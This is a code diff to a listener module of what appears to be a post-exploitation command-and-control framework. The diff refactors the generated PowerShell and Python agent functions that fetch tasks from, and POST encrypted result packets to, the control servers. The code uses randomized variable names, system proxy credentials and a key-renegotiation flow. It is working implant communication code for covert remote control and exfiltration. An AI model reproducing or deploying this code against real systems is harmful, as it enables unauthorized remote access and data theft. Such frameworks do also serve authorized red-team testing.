@@ -403,7 +403,7 @@ class Listener:
                 """ % (listenerOptions['Host']['Value'])
 
                 getTask = """
-                    $script:GetTask = {{
+                    $script:GetTask{name} = {{
                         param($FixedParameters)
                         $ControlServers = {ControlServers};
                         $ServerIndex = 0;
@@ -438,13 +438,17 @@ class Listener:
                             }}
                         }}
                     }}
+                    #TASK_FUNCTION
                 """
 
                 sendMessage = """
-                    $script:SendMessage = {
+                    $script:SendMessage{name} = {{
                         param($Packets)
 
-                        if($Packets) {
+                        $ControlServers = {ControlServers};
+                        $ServerIndex = 0;
+
+                        if($Packets) {{
                             # build and encrypt the response packet
                             $EncBytes = Encrypt-Bytes $Packets
 
@@ -452,49 +456,74 @@ class Listener:
                             # meta 'RESULT_POST' : 5
                             $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5
 
-                            if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
+                            if($ControlServers[$ServerIndex].StartsWith('http')) {{
                                 # build the web request object
                                 $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient
                                 # set the proxy settings for the WC to be the default system settings
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('User-Agent', $Script:UserAgent)
-                                $Script:Headers.GetEnumerator() | ForEach-Object {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
+                                $Script:Headers.GetEnumerator() | ForEach-Object {{$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}}
 
-                                try{
+                                try{{
                                     # get a random posting URI
-                                    $taskURI = $Script:TaskURIs | Get-Random
-                                    $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
-                                }
-                                catch [System.Net.WebException]{
+                                    $taskURI = $FixedParameters["taskURIs"].Split("{{,}}") | Get-Random
+                                    $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadData($ControlServers[$ServerIndex]+$taskURI, 'POST', $RoutingPacket);
+                                }}
+                                catch [System.Net.WebException]{{
                                     # exception posting data...
-                                    if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
+                                    if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {{
                                         # restart key negotiation
                                         Start-Negotiate -S "$ser" -SK $SK -UA $ua
-                                    }
-                                }
-                            }
-                        }
-                    }
+                                    }}
+                                }}
+                            }}
+                        }}
+                    }}
+                #COMM_FUNCTION
                 """
 
-                return updateServers + getTask + sendMessage
+                if deployed:
+                    return ( "$script:NewListenerDict = {};".format(listener_dict) +
+                            getTask.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']) +
+                            sendMessage.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']))
+                else:
+                    return (listener_dict,
+                            getTask.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']),
+                            sendMessage.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']))
 
             elif language.lower() == 'python':
 
                 updateServers = "server = '%s'\n"  % (listenerOptions['Host']['Value'])
+                listener_dict = """
+{{
+    'name': '{name}',
+    'delay' : {delay},
+    'jitter' : {jitter},
+    'fixed_parameters': {{
+        'headers' : {{'User-Agent': "{UA}", 'Cookie':"{cookie}"}},
+        'taskURIs' : "{taskURIs}",
+    }},
+    'send_func': {send_func},
+    'defaultResponse': "{defaultResponse}",
+    'lostLimit': {lostLimit},
+    'missedCheckins':0,
+}},
+#LISTENER_DICT
+"""
 
                 sendMessage = """
-def send_message(packets=None):
+def send_message_{name}(packets=None,**kwargs):
     # Requests a tasking or posts data to a randomized tasking URI.
     # If packets == None, the agent GETs a tasking from the control server.
     # If packets != None, the agent encrypts the passed packets and
     #    POSTs the data to the control server.
 
-    global missedCheckins
-    global server
-    global headers
-    global taskURIs
+    headers = kwargs['headers']
+    taskURIs = kwargs['taskURIs'].split(',')
+
+    {update_servers}
+    {https}
 
     data = None
     if packets:
@@ -517,18 +546,15 @@ def send_message(packets=None):
         return ('200', data)
 
     except urllib2.HTTPError as HTTPError:
-        # if the server is reached, but returns an erro (like 404)
-        missedCheckins = missedCheckins + 1
         #if signaled for restaging, exit.
         if HTTPError.code == 401:
             sys.exit(0)
 
     except urllib2.URLError as URLerror:
-        # if the server cannot be reached
-        missedCheckins = missedCheckins + 1
         return (URLerror.reason, '')
 
     return ('', '')
+#COMM_FUNCTION
 """
                 return updateServers + sendMessage
 
